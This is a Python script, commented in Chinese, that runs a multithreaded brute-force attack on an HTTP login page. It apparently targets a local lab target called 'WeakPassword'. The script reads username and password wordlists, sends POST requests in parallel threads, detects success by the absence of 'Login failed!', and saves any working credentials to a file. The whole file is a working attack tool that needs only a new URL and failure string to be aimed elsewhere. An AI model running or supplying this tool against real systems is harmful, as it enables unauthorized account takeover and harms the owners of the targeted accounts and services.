#!/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import threading
import requests

# 分块大小
BLOCK_SIZE = 1000

class ThreadWork:
    # 目标 URL
    url = "http://192.168.123.124/WeakPassword/login.php"
    # 请求头信息
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20'
    }

    def __init__(self, username, password):
        """
        类的构造函数，初始化用户名和密码列表
        """
        self.username = username
        self.password = password

    def run(self, username, password):
        """
        根据传入的用户名和密码进行爆破
        """
        # 构造 POST 请求的数据
        data = {
            'username': username,
            'password': password,
            'submit': '%E7%99%BB%E5%BD%95'
        }
        # 显示正在尝试的用户名和密码
        print(f"username:{username},password:{password}")
        # 发送 POST 请求
        response = requests.post(self.url, data=data, headers=self.headers)
        # 根据返回内容判断是否登录成功
        if 'Login failed!' in response.text:
            pass
        else:
            # 登录成功，显示用户名和密码，并写入结果文件
            print(f"success!!! username: {username}, password: {password}")
            with open('result', 'w') as resultFile:
                resultFile.write(f"success!!! username: {username}, password: {password}")
            # 正常退出程序
            os._exit(0)

    def start(self):
        """
        遍历用户名和密码列表，调用 run 方法进行爆破
        """
        for user_item in self.username:
            for pwd_item in self.password:
                self.run(user_item, pwd_item)

def brute_force_http():
    """
    对 HTTP 登录页面进行暴力破解
    """
    # 读取用户名和密码文件，存储到列表中
    list_username = [line.strip() for line in open("username")]
    list_password = [line.strip() for line in open("passwords")]
    # 对用户名和密码列表进行分块处理
    block_username = partition(list_username, BLOCK_SIZE)
    block_password = partition(list_password, BLOCK_SIZE)
    threads = []
    # 为每个用户名和密码子块创建线程
    for son_user_block in block_username:
        for son_pwd_block in block_password:
            # 实例化任务
            work = ThreadWork(son_user_block, son_pwd_block)
            # 创建线程
            work_thread = threading.Thread(target=work.start)
            # 将线程添加到线程列表中
            threads.append(work_thread)
    # 启动所有线程
    for t in threads:
        t.start()
    # 等待所有线程完成
    for t in threads:
        t.join()

# 列表分块函数
def partition(ls, size):
    """
    将列表按指定大小进行分块
    """
    return [ls[i:i + size] for i in range(0, len(ls), size)]

if __name__ == '__main__':
    print("\n#####################################")
    print("#     WeakPassowrd experiment       #")
    print("#####################################\n")
    # 启动暴力破解
    brute_force_http()